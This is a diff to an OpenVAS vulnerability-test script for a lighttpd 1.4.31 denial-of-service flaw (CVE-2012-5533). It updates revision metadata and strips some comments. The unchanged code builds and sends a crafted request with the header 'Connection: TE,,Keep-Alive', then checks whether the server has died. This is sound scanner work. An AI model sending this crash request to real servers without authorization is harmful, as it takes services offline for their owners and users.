@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_lighttpd_connection_hdr_dos_vuln.nasl 5977 2017-04-19 09:02:22Z teissa $
+# $Id: gb_lighttpd_connection_hdr_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
 #
 # Lighttpd Connection header Denial of Service Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = 'cpe:/a:lighttpd:lighttpd';
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802044");
-  script_version("$Revision: 5977 $");
+  script_version("$Revision: 11374 $");
   script_bugtraq_id(56619);
   script_cve_id("CVE-2012-5533");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-19 11:02:22 +0200 (Wed, 19 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-11-23 10:59:35 +0530 (Fri, 23 Nov 2012)");
   script_name("Lighttpd Connection header Denial of Service Vulnerability");
 
@@ -52,9 +52,7 @@ if(description)
   script_mandatory_keys("lighttpd/installed");
 
   script_tag(name:"impact", value:"Successful exploitation could allow attackers to cause a denial of service
-  via crafted Connection header values.
-
-  Impact Level: Application");
+  via crafted Connection header values.");
   script_tag(name:"affected", value:"Lighttpd version 1.4.31");
   script_tag(name:"insight", value:"The flaw is due to an error when processing certain Connection header values
   leading to enter in an endless loop denying further request processing.");
@@ -73,12 +71,10 @@ if(description)
 include("http_func.inc");
 include("host_details.inc");
 
-## Get HTTP Port
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 
 host = http_host_name(port:port);
 
-## Construct crafted request
 dos_req = string( "GET / HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Connection: TE,,Keep-Alive\r\n\r\n" );
@@ -87,7 +83,6 @@ dos_req = string( "GET / HTTP/1.1\r\n",
 dos_res = http_send_recv(port:port, data:dos_req);
 sleep(2);
 
-## Confirm Lighttpd Server is dead
 if(http_is_dead(port:port)){
   security_message(port:port);
   exit(0);
